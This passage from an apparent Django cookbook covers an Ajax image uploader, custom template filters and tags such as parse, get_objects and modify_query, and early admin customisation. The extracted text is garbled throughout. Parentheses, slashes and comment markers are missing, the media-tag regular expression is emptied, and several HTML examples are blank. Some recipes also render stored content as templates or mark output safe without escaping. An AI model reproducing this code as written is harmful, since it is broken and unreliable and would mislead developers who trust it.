select files again without it." %}',                 filesLimitError: '{% trans "No more than  {filesLimit} files are allowed to be uploaded." %}',                 onLeave: '{% trans "The files are being uploaded,  if you leave now the upload will be cancelled." %}'             }         };         var ajax_uploader_path = '{% url "ajax_uploader" %}';            <  script> {% endblock %}  7.  Finally, we create the JavaScript file that will initialize the file upload widget and   handle the image preview and deletion, as follows:    site_static site js change_quote.js $ function   {     var csrfmiddlewaretoken = $ 'input[name="csrfmiddlewaretok en"]' .val  ;     var $image_upload_widget = $ 'image_upload_widget' ;     var current_image_path = $ 'id_picture_path' .val  ;     if  current_image_path  {  290  Templates and JavaScript           $ '.preview', $image_upload_widget .html              '<img src="' + window.settings.MEDIA_URL + current_ image_path  + '" alt=""  >'          ;     }     var options = $.extend window.translatable_file_uploader_ options, {         allowedExtensions: ['jpg', 'jpeg', 'gif', 'png'],         action: window.ajax_uploader_path,         element: $ '.uploader', $image_upload_widget [0],         multiple: false,         onComplete: function id, fileName, responseJSON  {             if responseJSON.success  {                 $ '.messages', $image_upload_widget .html "" ;                    set the original to media_file_path                 $ 'id_picture_path' .val 'uploads ' + fileName ;                    show preview link                 $ '.preview', $image_upload_widget .html                      '<img src="' + window.settings.MEDIA_URL +  'uploads ' + fileName + '" alt=""  >'                  ;             }         },         onAllComplete: function uploads  {                uploads is an array of maps                the maps look like this: {file: FileObject,  response: JSONServerResponse}             $ '.qq-upload-success' .fadeOut "slow", function   {                 $ this .remove  ;             } ;         },         params: {             'csrf_token': csrfmiddlewaretoken,             'csrf_name': 'csrfmiddlewaretoken',             'csrf_xname': 'X-CSRFToken'         },         showMessage: function message  {             $ '.messages', $image_upload_widget .html                  ' ' + message + '<  div>'              ;         }     } ;     var uploader = new qq.FileUploader options ;  291  Chapter 4       $ '.qq-delete-button', $image_upload_widget .click function    {         $ '.messages', $image_upload_widget .html "" ;         $ '.preview', $image_upload_widget .html "" ;         $ 'id_delete_picture' .val 1 ;         return false;     } ; } ;  How it works… When an image is selected in the upload widget, the result in the browser will look similar to  the following screenshot:  292  Templates and JavaScript   The same form can be used to create an inspirational quote and change an existing  inspirational quote. Let's dig deeper into the process to see how it works. In the form,   we have an uploading mechanism that consists of the following essential parts:   f The area for the preview of the image that is defined as a   tag with the preview  CSS class. Initially, it might show an image if we are in an object change view and the  InspirationQuote object is passed to the template as {{ instance }}.  f The area for the Ajax uploader widget that is defined as a   tag with the   uploader CSS class. It will be filled with the dynamically-created uploading and  deleting buttons as well as the uploading progress indicators.   f The help text for the upload.  f The area for error messages that is defined as a   tag with the messages    CSS class.   f The hidden picture_path character field to set the path of the uploaded file.  f The hidden delete_picture Boolean field to mark the deletion of the file.  On page load, JavaScript will check whether picture_path is set; and if it is, it will show a  picture preview. This will be the case only when the form is submitted with an image selected;  however, there are validation errors.  Furthermore, we are defining the options for the upload widget in JavaScript. These options  are combined of the global translatable_file_uploader_options variable with  translatable strings set in the template and other configuration options set in the JavaScript  file. The Ajax upload widget is initialized with these options. Some important settings to note  are the onComplete callback that shows an image preview and fills in the picture_path  field when an image is uploaded and the showMessage callback that defines how to show  the error messages in the wanted area.  Lastly, there is a handler for the delete button in JavaScript, which when clicked, sets the  hidden delete_picture field to 1 and removes the preview image.  The Ajax uploader widget dynamically creates a form with the file upload field and a hidden    tag to post the form data. When a file is selected, it is immediately uploaded  to the uploads directory under MEDIA_URL and the path to the file is set to the hidden  picture_path field. This directory is a temporary location for the uploaded files. When a  user submits the inspirational quote form and the input is valid, the save   method is called.  If delete_picture is set to 1, the picture of the model instance will be deleted. If the  picture_path field is defined, the image from the temporary location will be copied to its  final destination and the original will be removed.  293  Chapter 4   See also   f The Uploading images recipe in Chapter 3, Forms and Views  f The Opening object details in a modal dialog recipe  f The Implementing a continuous scroll recipe  f The Implementing the Like widget recipe  294  Templates and JavaScript   5  Custom Template  Filters and Tags  In this chapter, we will cover the following topics:   f Following conventions for your own template filters and tags  f Creating a template filter to show how many days have passed since a post    was published   f Creating a template filter to extract the first media object  f Creating a template filter to humanize URLs  f Creating a template tag to include a template if it exists  f Creating a template tag to load a QuerySet in a template  f Creating a template tag to parse content as a template  f Creating a template tag to modify request query parameters  Introduction As you know, Django has an extensive template system with features such as template  inheritance, filters to change the representation of values, and tags for presentational logic.  Moreover, Django allows you to add your own template filters and tags to your apps. Custom  filters or tags should be located in a template-tag library file under the templatetags Python  package in your app. Then, your template-tag library can be loaded in any template with a {%  load %} template tag. In this chapter, we will create several useful filters and tags that will  give more control to template editors.  295   To see the template tags of this chapter in action, create a virtual environment,  extract the code provided for this chapter there, run the development server, and visit  http:  127.0.0.1:8000 en  in a browser.  Following conventions for your own template  filters and tags Custom template filters and tags can become a total mess if you don't have persistent guidelines  to follow. Template filters and tags should serve template editors as much as possible. They  should be both handy and flexible. In this recipe, we will take a look at some conventions that  should be used when enhancing the functionality of the Django template system.  How to do it... Follow these conventions when extending the Django template system:  1.  Don't create or use custom template filters or tags when the logic for the page fits   better in the view, context processors, or model methods. When your content is  context-specific, such as a list of objects or object-detail view, load the object in the  view. If you need to show some content on every page, create a context processor.  Use custom methods of the model instead of template filters when you need to get  some properties of an object that are not related to the context of the template. 2.  Name the template-tag library with the _tags suffix. When your app is named   3.   differently than your template-tag library, you can avoid ambiguous package  importing problems. In the newly created library, separate the filters from tags, for example, using  comments as shown the following code:  utils templatetags utility_tags.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals  from django import template  register = template.Library     FILTERS   .. your filters go here..   TAGS   .. your tags go here..  4.  When creating advanced custom template tags, make sure that their syntax is easy to   remember by including the following constructs:     for [app_name.model_name]: Include this construct in order to use a  specific model  296  Custom Template Filters and Tags            using [template_name]: Include this construct in order to use a  template for the output of the template tag limit [count]: Include this construct in order to limit the results to a  specific amount as [context_variable]: Include this construct in order to save the  results to a context variable that can be reused multiple times  5.  Try to avoid multiple values that are defined positionally in the template tags, unless  they are self-explanatory. Otherwise, this will likely confuse the template developers. 6.  Make as many resolvable arguments as possible. Strings without quotes should be  treated as context variables that need to be resolved or short words that remind you  of the structure of the template tag components.  Creating a template filter to show how   many days have passed since a post was  published Not all people keep track of the date and when talking about creation or modification dates  of cutting-edge information; for many of us, it is convenient to read the time difference. For  example, the blog entry was posted three days ago, the news article was published today, and  the user last logged in yesterday. In this recipe, we will create a template filter named days_ since, which converts dates to humanized time differences.  Getting ready Create the utils app and put it under INSTALLED_APPS in the settings, if you haven't done  that yet. Then, create a templatetags Python package in this app  Python packages are  directories with an empty __init__.py file .  How to do it... Create a utility_tags.py file with the following content:   utils templatetags utility_tags.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from datetime import datetime from django import template from django.utils.translation import ugettext_lazy as _ from django.utils.timezone import now as tz_now  297  Chapter 5   register = template.Library     FILTERS   @register.filter def days_since value :     """ Returns number of days between today and value."""      today = tz_now  .date       if isinstance value, datetime.datetime :         value = value.date       diff = today - value     if diff.days > 1:         return _ "%s days ago"  % diff.days     elif diff.days == 1:         return _ "yesterday"      elif diff.days == 0:         return _ "today"      else:          Date is in the future; return formatted date.         return value.strftime "%B %d, %Y"   How it works... If you use this filter in a template as shown in the following code, it will render something  similar to yesterday or 5 days ago:  {% load utility_tags %} {{ object.publisheddays_since }}  You can apply this filter to values of the date and datetime types.  Each template-tag library has a register, where filters and tags are collected. Django filters  are functions registered by the @register.filter decorator. By default, the filter in the  template system will be named same as the function or other callable object. If you want, you  can set a different name for the filter by passing the name to the decorator, as follows:  @register.filter name="humanized_days_since"  def days_since value :     ...  The filter itself is quite self-explanatory. At first, the current date is read. If the given value of  the filter is of the datetime type, date is extracted. Then, the difference between today and  the extracted value is calculated. Depending on the number of days, different string results  are returned.  298  Custom Template Filters and Tags   There's more... This filter is also easy to extend in order to show the difference in time, such as just now,   7 minutes ago, and 3 hours ago. Just operate on the datetime values instead of the   date values.  See also   f The Creating a template filter to extract the first media object recipe  f The Creating a template filter to humanize URLs recipe  Creating a template filter to extract the first  media object Imagine that you are developing a blog overview page, and for each post, you want to show  images, music, or videos in that page taken from the content. In such a case, you need to  extract the  ,  ,  ,  ,  ,  , and    tags from the HTML content of the post. In this recipe, we will see how to perform this using  regular expressions in the first_media filter.  Getting ready We will start with the utils app that should be set in INSTALLED_APPS in the settings and  the templatetags package in this app.  How to do it... In the utility_tags.py file, add the following content:   utils templatetags utility_tags.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import re from django import template from django.utils.safestring import mark_safe register = template.Library     FILTERS   media_tags_regex = re.compile   299  Chapter 5       r" "     r" "     r" "     r" "     r" "     r" ]+>",     re.MULTILINE    @register.filter def first_media content :     """ Returns the first image or flash file from the html      content """     m = media_tags_regex.search content      media_tag = ""     if m:         media_tag = m.group       return mark_safe media_tag   How it works... If the HTML content in the database is valid, when you put the following code in the template,  it will retrieve the media tags from the content field of the object; otherwise, an empty string  will be returned if no media is found:  {% load utility_tags %} {{ object.contentfirst_media }}  Regular expressions are powerful feature to search replace patterns of text. At first, we will  define the compiled regular expression as media_file_regex. In our case, we will search  for all the possible media tags that can also occur in multiple lines.  Python strings can be concatenated without a plus  +  symbol.  Let's see how this regular expression works, as follows:   f Alternating patterns are separated by the pipe    symbol.  f For possibly multiline tags, we will use the [\S\s]+? pattern that matches any   symbol at least once; however, as little times as possible, until we find the the  string that goes after it. Therefore,   searches for a    tag and everything after it, until it finds the closing   tag.   f Similarly, with the [^>]+ pattern, we search for any symbol except the greater than    >  symbol at least once and as many times as possible.  300  Custom Template Filters and Tags   The re.MULTILINE flag ensures that the search will happen in multiple lines. Then, in the  filter, we will perform a search for this regular expression pattern. By default, the result of  the filter will show the  , and & symbols escaped as the &lt;, &gt;, and &amp; entities.  However, we use the mark_safe   function that marks the result as safe and HTML-ready in  order to be shown in the template without escaping.  There's more... If you are interested in regular expressions, you can learn more about them in the official  Python documentation at https:  docs.python.org 2 library re.html.

In this recipe, we will create a humanize_url filter that is used to present URLs to the user in  a shorter format, truncating very long addresses, similar to what Twitter does with the links in  the tweets.  Getting ready Similar to the previous recipes, we will start with the utils app that should be set in  INSTALLED_APPS in the settings and contain the templatetags package.  How to do it... In the FILTERS section of the utility_tags.py template library in the utils app, let's  add a humanize_url filter and register it, as shown in the following code:   utils templatetags utility_tags.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import re from django import template  301  Chapter 5   register = template.Library     FILTERS   @register.filter def humanize_url url, letter_count :     """ Returns a shortened human-readable URL """     letter_count = int letter_count      re_start = re.compile r"^https?:  "      re_end = re.compile r" $"      url = re_end.sub "", re_start.sub "", url       if len url  > letter_count:         url = "%s…" % url[:letter_count - 1]     return url  How it works... We can use the humanize_url filter in any template, as follows:  {% load utility_tags %}       {{ object.websitehumanize_url:30 }}    The filter uses regular expressions to remove the leading protocol and trailing slash, shorten  the URL to the given amount of letters, and add an ellipsis to the end if the URL doesn't fit in  the specified letter count.

However, there is a problem in some situations, where an error is raised if the template does  not exist. In this recipe, we will see how to create a {% try_to_include %} template tag  that includes another template and fails silently if there is no such template.  302  Custom Template Filters and Tags   Getting ready We will start again with the utils app that is installed and ready for custom template tags.  How to do it... Advanced custom template tags consist of two things: the function that is parsing the  arguments of the template tag and the Node class that is responsible for the logic of the  template tag as well as the output. Perform the following steps to create the {% try_to_ include %} template tag:  1.  First, let's create the function parsing the template-tag arguments, as follows:   utils templatetags utility_tags.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django import template from django.template.loader import get_template register = template.Library     TAGS   @register.tag def try_to_include parser, token :   """Usage: {% try_to_include "sometemplate.html" %}   This will fail silently if the template doesn't exist.   If it does exist, it will be rendered with the current   context."""   try:     tag_name, template_name = token.split_contents     except ValueError:     raise template.TemplateSyntaxError, \       "%r tag requires a single argument" % \                   token.contents.split  [0]   return IncludeNode template_name   2.  Then, we need the Node class in the same file, as follows:  class IncludeNode template.Node :   def __init__ self, template_name :     self.template_name = template_name    def render self, context :     try:        Loading the template and rendering it       template_name = template.resolve_variable   303  Chapter 5           self. template_name, context        included_template = get_template          template_name        .render context      except template.TemplateDoesNotExist:       included_template = ""     return included_template  How it works... The {% try_to_include %} template tag expects one argument, that is, template_ name. Therefore, in the try_to_include   function, we try to assign the split contents of  the token only to the tag_name variable  which is try_to_include  and the template_ name variable. If this doesn't work, the template syntax error is raised. The function returns  the IncludeNode object, which gets the template_name field for later use.  In the render   method of IncludeNode, we resolve the template_name variable. If a  context variable was passed to the template tag, its value will be used here for template_ name. If a quoted string was passed to the template tag, then the content in the quotes will be  used for template_name.  Lastly, we will try to load the template and render it with the current template context. If that  doesn't work, an empty string is returned.  There are at least two situations where we could use this template tag:   f It is used when including a template whose path is defined in a model, as follows:  {% load utility_tags %} {% try_to_include object.template_path %}   f It is used when including a template whose path is defined with the {% with  %} template tag somewhere high in the template context variable's scope. This  is especially useful when you need to create custom layouts for plugins in the  placeholder of a template in Django CMS: { templates cms start_page.html } {% with editorial_content_template_path="cms plugins editorial_ content start_page.html" %}     {% placeholder "main_content" %} {% endwith %}  { templates cms plugins editorial_content.html } {% load utility_tags %}  {% if editorial_content_template_path %}     {% try_to_include editorial_content_template_path %}  304  Custom Template Filters and Tags   {% else %}               <!-- Some default presentation of              editorial content plugin -->       {% endif %}  There's more... You can use the {% try_to_include %} tag as well as the default {% include %} tag  to include the templates that extend other templates. This is beneficial for large-scale portals,  where you have different kinds of lists in which complex items share the same structure as  widgets but have a different source of data.  For example, in the artist list template, you can include the artist item template, as follows:  {% load utility_tags %} {% for object in object_list %}     {% try_to_include "artists includes artist_item.html" %} {% endfor %}  This template will extend from the item base, as follows:  { templates artists includes artist_item.html } {% extends "utils includes item_base.html" %}  {% block item_title %}     {{ object.first_name }} {{ object.last_name }} {% endblock %}  The item base defines the markup for any item and also includes a Like widget, as follows:  { templates utils includes item_base.html } {% load likes_tags %}   {% block item_title %}{% endblock %}  {% if request.user.is_authenticated %}     {% like_widget for object %} {% endif %}  See also   f The Creating templates for Django CMS recipe in Chapter 7, Django CMS  f The Writing your own CMS plugin recipe in Chapter 7, Django CMS  f The Implementing the Like widget recipe in Chapter 4, Templates and JavaScript  305  Chapter 5    f The Creating a template tag to load a QuerySet in a template recipe  f The Creating a template tag to parse content as a template recipe  f The Creating a template tag to modify request query parameters recipe  Creating a template tag to load a QuerySet  in a template Most often, the content that should be shown on a webpage will have to be defined in  the view. If this is the content to be shown on every page, it is logical to create a context  processor. Another situation is where you need to show additional content such as the latest  news or a random quote on some pages; for example, the starting page or the details page of  an object. In this case, you can load the necessary content with the {% get_objects %}  template tag, which we will implement in this recipe.  Getting ready Once again, we will start with the utils app that should be installed and ready for custom  template tags.  How to do it... An advanced custom template tag consists of a function that parses arguments that are  passed to the tag and a Node class that renders the output of the tag or modifies the template  context. Perform the following steps to create the {% get_objects %} template tag:  1.  First, let's create the function parsing the template-tag arguments, as follows:   utils templatetags utility_tags.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django import template register = template.Library     TAGS   @register.tag def get_objects parser, token :     """     Gets a queryset of objects of the model specified     by app and model names     Usage:         {% get_objects [ .]  from  306  Custom Template Filters and Tags             .

Then, we will create the Node class in the same file, as shown in the following code:  class ObjectsNode template.Node :     def __init__          self, model, manager_method, amount, var_name      :         self.model = model         self.manager_method = manager_method  307  Chapter 5           self.amount = amount         self.var_name = var_name      def render self, context :         if "." in self.manager_method:             manager, method = \                 self.manager_method.split "."          else:             manager = "_default_manager"             method = self.manager_method          qs = getattr              getattr self.model, manager ,             method,             self.model._default_manager.none,                     if self.amount:             amount = template.resolve_variable                  self.amount, context                           context[self.var_name] = qs[:amount]         else:             context[self.var_name] = qs         return ""  How it works... The {% get_objects %} template tag loads QuerySet  defined by the method of the  manager from a specified app and model, limits the result to the specified amount, and   saves the result to a context variable.  The following code is the simplest example of how to use the template tag that we have just  created. It will load all news articles in any template using the following snippet:  {% load utility_tags %} {% get_objects all from news.Article as all_articles %} {% for article in all_articles %}      {{ article.title }}  {% endfor %}  This is using the all   method of the default objects manager of the Article model and  it will sort the articles by the ordering attribute defined in the Meta class of the model.  308  Custom Template Filters and Tags   A more advanced example would be required to create a custom manager with a custom  method to query the objects from the database. A manager is an interface that provides the  database query operations to models. Each model has at least one manager called objects  by default. As an example, let's create an Artist model that has a draft or published status  and a new custom_manager that allows you to select random published artists:   artists models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _  STATUS_CHOICES =        "draft", _ "Draft" ,      "published", _ "Published" ,   class ArtistManager models.Manager :     def random_published self :         return self.filter status="published" .order_by "?"   class Artist models.Model :      ...     status = models.CharField _ "Status" , max_length=20,           choices=STATUS_CHOICES      custom_manager =  ArtistManager    To load a random published artist, you add the following snippet to any template:  {% load utility_tags %} {% get_objects custom_manager.random_published from artists.Artist  limit 1 as random_artists %} {% for artist in random_artists %}     {{ artist.first_name }} {{ artist.last_name }} {% endfor %}  Let's look at the code of the {% get_objects %} template tag. In the parsing function,  there is one of the two formats expected; with the limit and without it. The string is parsed,  the model is recognized, and then the components of the template tag are passed to the  ObjectNode class.  309  Chapter 5   In the render   method of the Node class, we will check the manager's name and its  method's name. If this is not defined, _default_manager will be used, which is an  automatic property of any model injected by Django and points to the first available models. Manager   instance. In most cases, _default_manager will be same as objects. After  that, we will call the method of the manager and fall back to empty QuerySet if the method  doesn't exist. If a limit is defined, we will resolve the value of it and limit QuerySet. Lastly, we  will save the QuerySet to the context variable.  See also   f The Creating a template tag to include a template if it exists recipe  f The Creating a template tag to parse content as a template recipe  f The Creating a template tag to modify request query parameters recipe  Creating a template tag to parse content as  a template In this recipe, we will create a {% parse %} template tag, which will allow you to put  template snippets in the database. This is valuable when you want to provide different content  for authenticated and unauthenticated users, when you want to include a personalized  salutation or you don't want to hardcode the media paths in the database.  Getting ready As usual, we will start with the utils app that should be installed and ready for custom  template tags.  How to do it... An advanced custom template tag consists of a function that parses the arguments that  are passed to the tag and a Node class that renders the output of the tag or modifies the  template context. Perform the following steps to create them:  1.  First, let's create the function parsing the arguments of the template tag, as follows:   utils templatetags utility_tags.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django import template  310  Custom Template Filters and Tags   register = template.Library     TAGS   @register.tag def parse parser, token :     """     Parses the value as a template and prints it or     saves to a variable     Usage:         {% parse   [as  ] %}     Examples:         {% parse object.description %}         {% parse header as header %}         {% parse "{{ MEDIA_URL }}js " as js_url %}     """     bits = token.split_contents       tag_name = bits.pop 0      try:         template_value = bits.pop 0          var_name = None         if len bits  == 2:             bits.pop 0    remove the word "as"             var_name = bits.pop 0      except ValueError:         raise template.TemplateSyntaxError, \             "parse tag requires a following syntax: "\             "{% parse   [as  ] %}"      return ParseNode template_value, var_name   2.  Then, we will create the Node class in the same file, as follows:  class ParseNode template.Node :     def __init__ self, template_value, var_name :         self.template_value = template_value         self.var_name = var_name      def render self, context :         template_value = template.resolve_variable              self.template_value, context          t = template.Template template_value          context_vars = {}         for d in list context :             for var, val in d.items  :  311  Chapter 5                   context_vars[var] = val         result = t.render template.RequestContext              context["request"], context_vars           if self.var_name:             context[self.var_name] = result             return ""         return result  How it works... The {% parse %} template tag allows you to parse a value as a template and render it  immediately or save it as a context variable.  If we have an object with a description field, which can contain template variables or logic, we  can parse and render it using the following code:  {% load utility_tags %} {% parse object.description %}  It is also possible to define a value in order to parse using a quoted string as shown in   the following code:  {% load utility_tags %} {% parse "{{ STATIC_URL }}site img " as img_path %}    Let's take a look at the code of the {% parse %} template tag. The parsing function checks the  arguments of the template tag bit by bit. At first, we expect the parse name, then the template  value, and at last we expect the optional as word followed by the context variable name. The  template value and variable name are passed to the ParseNode class. The render   method  of that class, at first, resolves the value of the template variable and creates a template object  out of it. Then, it renders the template with all the context variables. If the variable name is  defined, the result is saved to it; otherwise, the result is shown immediately.

However, there is a lack of  built-in mechanisms in order to manage query parameters. Views such as search or filterable  object lists need to accept query parameters to drill down through the filtered results using  another parameter or to go to another page. In this recipe, we will create the {% modify_ query %}, {% add_to_query %}, and {% remove_from_query %} template tags,  which let you add, change, or remove the parameters of the current query.  Getting ready Once again, we start with the utils app that should be set in INSTALLED_APPS and contain  the templatetags package.  Also, make sure that you have the request context processor set for the TEMPLATE_ CONTEXT_PROCESSORS setting, as follows:   conf base.py or settings.py TEMPLATE_CONTEXT_PROCESSORS =       "django.contrib.auth.context_processors.auth",     "django.core.context_processors.debug",     "django.core.context_processors.i18n",     "django.core.context_processors.media",     "django.core.context_processors.static",     "django.core.context_processors.tz",     "django.contrib.messages.context_processors.messages",     "django.core.context_processors.request",    How to do it... For these template tags, we will be using the simple_tag decorator that parses the  components and requires you to just define the rendering function, as follows:  1.  At first, we will create the {% modify_query %} template tag:   utils templatetags utility_tags.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import urllib from django import template  313  Chapter 5   from django.utils.encoding import force_str register = template.Library     TAGS   @register.simple_tag takes_context=True  def modify_query      context, *params_to_remove, **params_to_change  :     """ Renders a link with modified current query     parameters """     query_params = []     for key, value_list in \         context["request"].GET._iterlists  :         if not key in params_to_remove:              don't add key-value pairs for              params_to_change             if key in params_to_change:                 query_params.append                       key, params_to_change[key]                                    params_to_change.pop key              else:                  leave existing parameters as they were                  if not mentioned in the params_to_change                 for value in value_list:                     query_params.append  key, value        attach new params     for key, value in params_to_change.items  :         query_params.append  key, value       query_string = context["request"].path     if len query_params :         query_string += "?%s" % urllib.urlencode [              key, force_str value               for  key, value  in query_params if value         ] .replace "&", "&amp;"      return query_string  2.  Then, let's create the {% add_to_query %} template tag:  @register.simple_tag takes_context=True  def add_to_query      context, *params_to_remove, **params_to_add  :     """ Renders a link with modified current query  314  Custom Template Filters and Tags       parameters """     query_params = []      go through current query params..     for key, value_list in \         context["request"].GET._iterlists  :         if not key in params_to_remove:              don't add key-value pairs which already              exist in the query             if key in params_to_add and \             unicode params_to_add[key]  in value_list:                 params_to_add.pop key              for value in value_list:                 query_params.append  key, value        add the rest key-value pairs     for key, value in params_to_add.items  :         query_params.append  key, value        empty values will be removed     query_string = context["request"].path     if len query_params :         query_string += "?%s" % urllib.urlencode [              key, force_str value               for  key, value  in query_params if value         ] .replace "&", "&amp;"      return query_string  3.  Lastly, let's create the {% remove_from_query %} template tag:  @register.simple_tag takes_context=True  def remove_from_query context, *args, **kwargs :     """ Renders a link with modified current query     parameters """     query_params = []      go through current query params..     for key, value_list in \         context["request"].GET._iterlists  :          skip keys mentioned in the args         if not key in args:             for value in value_list:                  skip key-value pairs mentioned in kwargs                 if not  key in kwargs and                   unicode value  == unicode kwargs[key]  :                     query_params.append  key, value        empty values will be removed     query_string = context["request"].path     if len query_params :  315  Chapter 5           query_string = "?%s" % urllib.urlencode [              key, force_str value               for  key, value  in query_params if value         ] .replace "&", "&amp;"      return query_string  How it works... All the three created template tags behave similarly. At first, they read the current query  parameters from the request.GET dictionary-like QueryDict object to a new list of key  value query_params tuples. Then, the values are updated depending on the positional  arguments and keyword arguments. Lastly, the new query string is formed, all spaces and  special characters are URL-encoded, and the ampersands connecting the query parameters  are escaped. This new query string is returned to the template.  To read more about the QueryDict objects, refer to the official Django  documentation at https:  docs.djangoproject.com en 1.8  ref request-response querydict-objects.  Let's take a look at an example of how the {% modify_query %} template tag can be used.  Positional arguments in the template tag define which query parameters are to be removed and  the keyword arguments define which query parameters are to be modified at the current query.  If the current URL is http:  127.0.0.1:8000 artists ?category=fine-art&page=5,  we can use the following template tag to render a link that goes to the next page:  {% load utility_tags %}  6   The following snippet is the output rendered using the preceding template tag:   6   We can also use the following example to render a link that resets pagination and goes to  another category, Sculpture, as follows:  {% load utility_tags i18n %}  {% trans  "Sculpture" %}   The following snippet is the output rendered using the preceding template tag:   Sculpture   316  Custom Template Filters and Tags   With the {% add_to_query %} template tag, you can add the parameters step-by-step  with the same name. For example, if the current URL is http:  127.0.0.1:8000  artists ?category=fine-art, you can add another category, Sculpture, with   the help of the following link:  {% load utility_tags i18n %}  {% trans  "Sculpture" %}   This will be rendered in the template as shown in the following snippet:   Sculptu re   Lastly, with the help of the {% remove_from_query %} template tag, you can remove  the parameters step-by-step with the same name. For example, if the current URL is  http:  127.0.0.1:8000 artists ?category=fine-art&category=sculpture,  you can remove the Sculpture category with the help of the following link:  {% load utility_tags i18n %}  <span  class="glyphicon glyphicon-remove">  {% trans "Sculpture" %}   This will be rendered in the template as follows:   <span class="glyphicon  glyphicon-remove">  Sculpture   See also   f The Filtering object lists recipe in Chapter 3, Forms and Views  f The Creating a template tag to include a template if it exists recipe  f The Creating a template tag to load a QuerySet in a template recipe  f The Creating a template tag to parse content as a template recipe  317  Chapter 5    6  Model Administration  In this chapter, we will cover the following topics:   f Customizing columns on the change list page  f Creating admin actions  f Developing change list filters  f Customizing default admin settings  f Inserting a map on a change form  Introduction The Django framework comes with a built-in administration system for your models. With very  little effort, you can set up filterable, searchable, and sortable lists for browsing your models  and configure forms to add and edit data. In this chapter, we will go through the advanced  techniques to customize administration by developing some practical cases.  Customizing columns on the change   list page Change list views in the default Django administration system let you have an overview of  all instances of the specific models. By default, the list_display model admin property  controls the fields that are shown in different columns. Additionally, you can have custom  functions set there that return the data from relations or display custom HTML. In this recipe,  we will create a special function for the list_display property that shows an image in one  of the columns of the list view. As a bonus, we will make one field directly editable in the list  view by adding the list_editable setting.  319   Getting ready To start with, make sure that django.contrib.admin is in INSTALLED_APPS in the  settings and AdminSite is hooked in the URL configuration. Then, create a new products  app and put it under INSTALLED_APPS. This app will have the Product and ProductPhoto  models, where one product might have multiple photos. For this example, we will also be  using UrlMixin, which was defined in the Creating a model mixin with URL-related methods  recipe in Chapter 2, Database Structure.  Let's create the Product and ProductPhoto models in the models.py file, as follows:   products models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os from django.db import models from django.utils.timezone import now as timezone_now from django.utils.translation import ugettext_lazy as _ from django.core.urlresolvers import reverse from django.core.urlresolvers import NoReverseMatch from django.utils.encoding import python_2_unicode_compatible from utils.models import UrlMixin  def upload_to instance, filename :     now = timezone_now       filename_base, filename_ext = os.path.splitext filename      return "products %s %s%s" %           instance.product.slug,         now.strftime "%Y%m%d%H%M%S" ,         filename_ext.lower  ,        @python_2_unicode_compatible class Product UrlMixin :     title = models.CharField _ "title" , max_length=200      slug = models.SlugField _ "slug" , max_length=200      description = models.TextField _ "description" , blank=True      price = models.DecimalField _ "price  € " , max_digits=8,         decimal_places=2, blank=True, null=True       class Meta:         verbose_name = _ "Product"   320  Model Administration           verbose_name_plural = _ "Products"       def __str__ self :         return self.title      def get_url_path self :         try:             return reverse "product_detail", kwargs={                 "slug": self.slug             }          except NoReverseMatch:             return ""  @python_2_unicode_compatible class ProductPhoto models.Model :     product = models.ForeignKey Product      photo = models.ImageField _ "photo" , upload_to=upload_to       class Meta:         verbose_name = _ "Photo"          verbose_name_plural = _ "Photos"       def __str__ self :         return self.photo.name  How to do it... We will create a simple administration for the Product model that will have instances of the  ProductPhoto model attached to the product as inlines.  In the list_display property, we will list the get_photo   method of the model admin  that will be used to show the first photo from many-to-one relationship.  Let's create an admin.py file with the following content:   products admin.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.contrib import admin from django.utils.translation import ugettext_lazy as _  321  Chapter 6   from django.http import HttpResponse  from .models import Product, ProductPhoto  class ProductPhotoInline admin.StackedInline :     model = ProductPhoto     extra = 0  class ProductAdmin admin.ModelAdmin :     list_display = ["title", "get_photo", "price"]     list_editable = ["price"]      fieldsets =            _ "Product" , {             "fields":  "title", "slug", "description", "price" ,         } ,           prepopulated_fields = {"slug":  "title", }     inlines = [ProductPhotoInline]      def get_photo self, obj :         project_photos = obj.productphoto_set.all  [:1]         if project_photos.count   > 0:             return """                                 """ % {                 "product_url": obj.get_url_path  ,                 "photo_url":  project_photos[0].photo.url,             }         return ""     get_photo.short_description = _ "Preview"      get_photo.allow_tags = True  admin.site.register Product, ProductAdmin   322  Model Administration   How it works... If you look at the product administration list in the browser, it will look similar to the following  screenshot:  Usually, the list_display property defines the fields to list in the administration list view;  for example, title and price are the fields of the Product model.  Besides the normal field names, the list_display property accepts a function or   another callable, the name of an attribute of the admin model, or the name of the   attribute of the model.  323  Chapter 6   In Python, a callable is a function, method, or a class that implements  the __call__   method. You can check whether a variable is  callable using the callable   function.  Each callable that you use in list_display will get a model instance passed as the first  argument. Therefore, in our example, we have the get_photo   method of the model admin  that retrieves the Product instance as obj. The method tries to get the first ProductPhoto  from the many-to-one relationship and, if it exists, it returns the HTML with the   tag  linked to the detail page of Product.  You can set several attributes for the callables that you use in list_display. The short_ description attribute of the callable defines the title shown for the column. The allow_ tags attribute informs administration to not escape the HTML values.  In addition, the Price field is made editable by the list_editable setting and there is a  Save button at the bottom to save the whole list of products.  There's more... Ideally, the get_photo   method shouldn't have any hardcoded HTML in it; however, it  should load and render a template from a file. For this, you can utilize the render_to_ string   function from django.template.loader. Then, your presentation logic will be  separated from the business logic. I am leaving this as an exercise for you.  See also   f The Creating a model mixin with URL-related methods recipe in Chapter 2,    Database Structure   f The Creating admin actions recipe  f The Developing change list filters recipe  Creating admin actions The Django administration system provides actions that we can execute for selected items in  the list. There is one action given by default and it is used to delete selected instances. In this  recipe, we will create an additional action for the list of the Product model that allows the  administrators to export selected products to Excel spreadsheets.  324  Model Administration   Getting ready We will start with the products app that we created in the previous recipe.  Make sure that you have the xlwt module installed in your virtual environment to create an  Excel spreadsheet:   myproject_env $ pip install xlwt  How to do it... Admin actions are functions that take three arguments: the current ModelAdmin value, the  current HttpRequest value, and the QuerySet value containing the selected items. Perform  the following steps to create a custom admin action:  1.  Let's create an export_xls   function in the admin.py file of the products app,    as follows:  products admin.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import xlwt  ... other imports ...  def export_xls modeladmin, request, 